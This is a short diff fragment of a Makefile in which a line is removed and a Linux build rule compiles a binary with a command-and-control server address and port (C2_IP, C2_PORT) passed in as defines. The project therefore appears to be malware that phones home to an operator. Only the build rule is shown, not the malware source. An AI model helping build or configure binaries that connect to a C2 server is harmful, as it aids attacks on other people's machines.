@@ -50,7 +50,7 @@ endif
 endif
 
 
-else
+
 ifeq ($(shell uname -s),Linux)
 	$(eval $(call uninput))
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
